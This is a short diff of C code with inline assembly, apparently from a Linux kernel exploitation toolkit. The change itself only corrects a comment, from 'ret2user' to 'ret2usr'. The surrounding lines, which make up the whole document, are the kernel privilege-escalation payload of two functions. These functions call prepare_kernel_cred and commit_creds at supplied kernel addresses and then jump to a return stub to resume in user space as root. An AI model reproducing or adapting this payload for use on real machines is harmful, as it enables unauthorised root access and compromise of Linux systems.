@@ -23,7 +23,7 @@ void _glb_commit_prepare_cred(void)
         "mov rdi, rax;"
         "movabs rax, " stringify(COMMIT_CREDS_ADDR) ";"
         "call rax;"
-        // jmp to ret2user_trampoline or any return stub
+        // jmp to ret2usr_trampoline or any return stub
         "movabs rax, " stringify(POST_PRIVESC_JUMP_ADDR) ";"
         "jmp rax;"
         ".att_syntax;"
@@ -48,7 +48,7 @@ void __commit_prepare_cred(uintptr_t commit_creds_addr,
         "mov rdi, rax;"
         "mov rax, %[cc];"
         "call rax;"
-        // jmp to ret2user_trampoline or any return stub
+        // jmp to ret2usr_trampoline or any return stub
         "mov rax, %[ret];"
         "jmp rax;"
         ".att_syntax;"
